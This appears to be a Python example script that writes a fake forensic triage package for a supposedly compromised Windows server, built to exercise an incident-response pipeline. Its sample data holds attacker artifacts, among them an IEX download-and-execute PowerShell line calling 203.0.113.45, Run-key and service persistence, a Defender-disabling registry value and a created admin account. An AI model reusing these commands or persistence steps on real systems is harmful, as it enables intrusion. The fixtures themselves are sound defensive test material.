"""Build a sample collection package, exactly as the live collector would emit one.

Represents a fast live triage of a compromised host (WEB-03): processes, network
connections, local users, registry persistence, and recent events — plus a
manifest with a SHA-256 for every file. Lets the whole collect -> verify ->
analyze pipeline be exercised end-to-end without a real endpoint.

Run:  python examples/make_sample_collection.py
"""

import hashlib
import json
from pathlib import Path

OUT = Path(__file__).resolve().parent / "sample-collection"
HOST = "WEB-03"
C2 = "203.0.113.45"

PROCESSES = [
    {"pid": 700, "ppid": 660, "name": "explorer.exe", "path": "C:\\Windows\\explorer.exe",
     "cmdline": "explorer.exe", "user": "WEB-03\\jdoe", "created": "2026-05-02T08:00:00Z", "hash": ""},
    {"pid": 2104, "ppid": 700, "name": "powershell.exe",
     "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
     "cmdline": "powershell -nop -w hidden -enc SQBFAFgA", "user": "WEB-03\\jdoe",
     "created": "2026-05-02T09:12:00Z", "hash": ""},
    {"pid": 3320, "ppid": 2104, "name": "svchost.exe", "path": "C:\\Users\\Public\\svchost.exe",
     "cmdline": "C:\\Users\\Public\\svchost.exe", "user": "WEB-03\\jdoe",
     "created": "2026-05-02T09:12:30Z", "hash": "9F2A...SHA256"},
    {"pid": 4480, "ppid": 3320, "name": "rundll32.exe", "path": "C:\\Windows\\System32\\rundll32.exe",
     "cmdline": "rundll32.exe C:\\Users\\Public\\d.dll,Run", "user": "WEB-03\\jdoe",
     "created": "2026-05-02T09:14:00Z", "hash": ""},
]

NETWORK = [
    {"proto": "tcp", "local": "10.0.2.40:50112", "remote": f"{C2}:443", "state": "Established",
     "pid": 3320, "process": "svchost.exe"},
    {"proto": "tcp", "local": "10.0.2.40:50120", "remote": "10.0.0.5:443", "state": "Established",
     "pid": 980, "process": "chrome.exe"},
]

USERS = [
    {"name": "jdoe", "enabled": True, "last_logon": "2026-05-02T08:00:00Z", "groups": ""},
    {"name": "supportadmin", "enabled": True, "last_logon": "", "groups": "Administrators"},
]

SERVICES = [
    {"name": "FakeSvc", "display": "Windows Update Helper", "path": "C:\\Windows\\Temp\\f.exe",
     "start": "Auto", "state": "Running", "account": "LocalSystem"},
]

PROGRAMS = [
    {"name": "svchost.exe", "path": "C:\\Users\\Public\\svchost.exe",
     "sha1": "A94A8FE5CCB19BA61C4C0873D391E987982FBBD3", "first_run": "2026-05-02T09:12:30Z"},
    {"name": "f.exe", "path": "C:\\Windows\\Temp\\f.exe",
     "sha1": "DA39A3EE5E6B4B0D3255BFEF95601890AFD80709", "first_run": "2026-05-02T09:13:00Z"},
]

REGISTRY = [
    {"hive": "HKLM", "key": "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
     "value_name": "Updater", "value_data": "C:\\Users\\Public\\svchost.exe",
     "last_write": "", "category": "run"},
    {"hive": "HKLM", "key": "SYSTEM\\CurrentControlSet\\Services\\FakeSvc",
     "value_name": "ImagePath", "value_data": "C:\\Windows\\Temp\\f.exe", "last_write": "", "category": "service"},
    {"hive": "HKLM", "key": "SOFTWARE\\Policies\\Microsoft\\Windows Defender",
     "value_name": "DisableAntiSpyware", "value_data": "1", "last_write": "", "category": "other"},
    {"hive": "HKLM", "key": "Disk&Ven_SanDisk&Prod_Ultra",
     "value_name": "FriendlyName", "value_data": "SanDisk Ultra USB Device", "last_write": "", "category": "usbstor"},
]


def e(ts, eid, detail, **kw):
    base = {"ts": ts, "event_id": eid, "channel": "Security", "computer": HOST,
            "user": "", "process": "", "parent_process": "", "cmdline": "", "dst_ip": "", "detail": detail}
    base.update(kw)
    return base


EVENTS = [
    e("2026-05-02T09:12:00Z", 4688, "encoded PowerShell", process="powershell.exe",
      cmdline="powershell -nop -w hidden -enc SQBFAFgA"),
    e("2026-05-02T09:12:05Z", 4104, "ScriptBlock: IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.45/a')",
      channel="Microsoft-Windows-PowerShell/Operational"),
    e("2026-05-02T09:13:00Z", 7045, "A new service was installed: FakeSvc"),
    e("2026-05-02T09:14:00Z", 4688, "proxied execution", process="rundll32.exe"),
    e("2026-05-02T09:16:00Z", 4720, "A user account was created: supportadmin"),
    e("2026-05-02T09:18:00Z", 4698, "Scheduled task created: \\Updater -> C:\\Users\\Public\\svchost.exe"),
    e("2026-05-02T09:25:00Z", 6416, "external device recognized: USBSTOR"),
    e("2026-05-02T09:40:00Z", 1102, "The audit log was cleared"),
]

FILES = {
    "events.json": EVENTS, "registry.json": REGISTRY, "processes.json": PROCESSES,
    "network.json": NETWORK, "users.json": USERS, "services.json": SERVICES,
    "programs.json": PROGRAMS,
}


def main():
    OUT.mkdir(parents=True, exist_ok=True)
    entries = []
    for name, data in FILES.items():
        path = OUT / name
        path.write_text(json.dumps(data, indent=2))
        sha = hashlib.sha256(path.read_bytes()).hexdigest().upper()
        entries.append({"name": name, "sha256": sha, "count": len(data)})
    manifest = {
        "case_id": "IR-2026-031", "operator": "T.Nelson", "collector_version": "1.0.0",
        "profile": "quick",
        "host": {"computer": HOST, "os": "Windows Server 2022",
                 "boot_time": "2026-05-01T22:00:00Z", "current_user": "WEB-03\\jdoe",
                 "collected_at": "2026-05-02T10:05:00Z"},
        "collected_at": "2026-05-02T10:05:00Z", "files": entries,
    }
    (OUT / "manifest.json").write_text(json.dumps(manifest, indent=2))
    print(f"wrote sample collection package -> {OUT} ({len(entries)} artifact files)")


if __name__ == "__main__":
    main()
